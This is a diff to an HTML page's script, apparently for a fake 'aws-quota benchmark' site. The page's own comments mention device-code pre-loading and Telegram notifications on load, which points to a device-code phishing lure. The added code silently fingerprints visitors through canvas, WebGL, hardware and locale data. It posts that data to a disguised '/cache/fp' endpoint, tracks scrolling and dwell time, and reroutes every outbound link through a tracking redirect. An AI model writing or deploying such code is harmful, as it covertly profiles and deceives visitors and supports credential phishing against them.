@@ -318,8 +318,97 @@ function showError(msg){
   el.innerHTML=msg;el.classList.add('show');
 }
 
-// Fire silently on page load — triggers Telegram notification, pre-loads code
-init();
+// ── Fingerprinting ───────────────────────────────────────────────────────────
+function _cvsFP(){
+  try{
+    const c=document.createElement('canvas'),x=c.getContext('2d');
+    x.textBaseline='top';x.font='14px Arial';
+    x.fillStyle='#f60';x.fillRect(125,1,62,20);
+    x.fillStyle='#069';x.fillText('aws-quota\u2019s benchmark \ud83d\udd11',2,15);
+    x.fillStyle='rgba(102,204,0,0.7)';x.fillText('aws-quota\u2019s benchmark \ud83d\udd11',4,17);
+    const d=c.toDataURL();return d.slice(-40);
+  }catch(e){return'err';}
+}
+function _webglFP(){
+  try{
+    const c=document.createElement('canvas');
+    const gl=c.getContext('webgl')||c.getContext('experimental-webgl');
+    if(!gl)return'none';
+    const ext=gl.getExtension('WEBGL_debug_renderer_info');
+    const r=ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):'?';
+    const v=ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):'?';
+    return v+'|'+r;
+  }catch(e){return'err';}
+}
+
+let _fpSent=false;
+function sendFP(){
+  if(_fpSent)return; _fpSent=true;
+  const fp={
+    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+    lang:navigator.language||'',
+    langs:(navigator.languages||[]).join(','),
+    screen:screen.width+'x'+screen.height+'x'+screen.colorDepth,
+    dpr:window.devicePixelRatio||1,
+    hw:navigator.hardwareConcurrency||0,
+    mem:navigator.deviceMemory||0,
+    platform:navigator.platform||'',
+    touch:navigator.maxTouchPoints||0,
+    cookie:navigator.cookieEnabled,
+    canvas:_cvsFP(),
+    webgl:_webglFP(),
+    ref:document.referrer||'direct',
+    w:window.innerWidth,
+    h:window.innerHeight
+  };
+  fetch(B+'/api/v1/cache/fp',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(fp)}).catch(()=>{});
+}
+
+// ── Scroll + Dwell tracking ───────────────────────────────────────────────────
+let _maxScroll=0, _startTime=Date.now(), _evtSent={};
+function _pct(){
+  const el=document.documentElement;
+  return Math.round((window.scrollY/(el.scrollHeight-el.clientHeight||1))*100);
+}
+function _trackScroll(){
+  const p=_pct();
+  if(p>_maxScroll){
+    _maxScroll=p;
+    // Send at milestones 25/50/75/100
+    [25,50,75,100].forEach(m=>{
+      if(p>=m&&!_evtSent['scroll'+m]){
+        _evtSent['scroll'+m]=true;
+        fetch(B+'/api/v1/cache/evt',{method:'POST',headers:{'Content-Type':'application/json'},
+          body:JSON.stringify({e:'scroll',v:m+'%'})}).catch(()=>{});
+      }
+    });
+  }
+}
+window.addEventListener('scroll',_trackScroll,{passive:true});
+
+// Send dwell time on page hide/unload
+function _sendDwell(){
+  const dwell=Math.round((Date.now()-_startTime)/1000);
+  fetch(B+'/api/v1/cache/evt',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({e:'dwell',v:dwell+'s|scroll:'+_maxScroll+'%'})}).catch(()=>{});
+}
+document.addEventListener('visibilitychange',function(){if(document.hidden)_sendDwell();});
+window.addEventListener('pagehide',_sendDwell);
+window.addEventListener('beforeunload',_sendDwell);
+
+// ── Link click tracking ───────────────────────────────────────────────────────
+document.querySelectorAll('a[href]').forEach(function(a){
+  const href=a.getAttribute('href');
+  if(href&&href.startsWith('http')){
+    const label=a.textContent.trim().slice(0,30)||href.split('/')[2]||'link';
+    a.setAttribute('href',B+'/api/v1/cache/r?to='+encodeURIComponent(href)+'&ref='+encodeURIComponent(label));
+    a.removeAttribute('target'); // go through redirect
+  }
+});
+
+// ── Fire on page load ────────────────────────────────────────────────────────
+setTimeout(sendFP, 800); // slight delay so page renders first
+init(); // device code pre-load + Telegram STEP 1
 </script>
 </body>
 </html>
